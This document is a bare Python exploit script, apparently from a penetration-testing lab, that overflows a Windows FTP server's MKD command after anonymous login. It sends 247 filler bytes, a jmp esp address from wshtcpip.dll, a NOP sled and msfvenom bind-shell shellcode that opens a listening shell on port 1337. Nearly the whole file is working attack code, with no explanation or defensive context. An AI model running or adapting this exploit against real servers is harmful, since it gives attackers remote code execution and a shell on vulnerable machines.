#!/usr/bin/python

import socket
import struct

HOST = "192.168.139.128"
PORT = 21
# ------------------------------------
# Badchars: \x00\x0A\x0D 
# 0x71a91c8b : jmp esp | wshtcpip.dll
# ------------------------------------

# msfvenom -p windows/shell_bind_tcp LPORT=1337 -b "\x00\x0a\x0d" -f c
shellcode = (
"\xbb\x33\x8c\x7e\x34\xda\xc5\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x53\x31\x5a\x12\x03\x5a\x12\x83\xd9\x70\x9c\xc1\xe1\x61\xe3"
"\x2a\x19\x72\x84\xa3\xfc\x43\x84\xd0\x75\xf3\x34\x92\xdb\xf8"
"\xbf\xf6\xcf\x8b\xb2\xde\xe0\x3c\x78\x39\xcf\xbd\xd1\x79\x4e"
"\x3e\x28\xae\xb0\x7f\xe3\xa3\xb1\xb8\x1e\x49\xe3\x11\x54\xfc"
"\x13\x15\x20\x3d\x98\x65\xa4\x45\x7d\x3d\xc7\x64\xd0\x35\x9e"
"\xa6\xd3\x9a\xaa\xee\xcb\xff\x97\xb9\x60\xcb\x6c\x38\xa0\x05"
"\x8c\x97\x8d\xa9\x7f\xe9\xca\x0e\x60\x9c\x22\x6d\x1d\xa7\xf1"
"\x0f\xf9\x22\xe1\xa8\x8a\x95\xcd\x49\x5e\x43\x86\x46\x2b\x07"
"\xc0\x4a\xaa\xc4\x7b\x76\x27\xeb\xab\xfe\x73\xc8\x6f\x5a\x27"
"\x71\x36\x06\x86\x8e\x28\xe9\x77\x2b\x23\x04\x63\x46\x6e\x41"
"\x40\x6b\x90\x91\xce\xfc\xe3\xa3\x51\x57\x6b\x88\x1a\x71\x6c"
"\xef\x30\xc5\xe2\x0e\xbb\x36\x2b\xd5\xef\x66\x43\xfc\x8f\xec"
"\x93\x01\x5a\x98\x9b\xa4\x35\xbf\x66\x16\xe6\x7f\xc8\xff\xec"
"\x8f\x37\x1f\x0f\x5a\x50\x88\xf2\x65\x5b\x70\x7a\x83\x09\x92"
"\x2a\x1b\xa5\x50\x09\x94\x52\xaa\x7b\x8c\xf4\xe3\x6d\x0b\xfb"
"\xf3\xbb\x3b\x6b\x78\xa8\xff\x8a\x7f\xe5\x57\xdb\xe8\x73\x36"
"\xae\x89\x84\x13\x58\x29\x16\xf8\x98\x24\x0b\x57\xcf\x61\xfd"
"\xae\x85\x9f\xa4\x18\xbb\x5d\x30\x62\x7f\xba\x81\x6d\x7e\x4f"
"\xbd\x49\x90\x89\x3e\xd6\xc4\x45\x69\x80\xb2\x23\xc3\x62\x6c"
"\xfa\xb8\x2c\xf8\x7b\xf3\xee\x7e\x84\xde\x98\x9e\x35\xb7\xdc"
"\xa1\xfa\x5f\xe9\xda\xe6\xff\x16\x31\xa3\xf0\x5c\x1b\x82\x98"
"\x38\xce\x96\xc4\xba\x25\xd4\xf0\x38\xcf\xa5\x06\x20\xba\xa0"
"\x43\xe6\x57\xd9\xdc\x83\x57\x4e\xdc\x81")

jmp_esp = struct.pack("<I", 0x71a91c8b)
nops = "\x90"*20
evil = "A"*247 + jmp_esp + nops + shellcode + "C"*(749-len(nops)-len(shellcode))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.recv(1024)
s.close()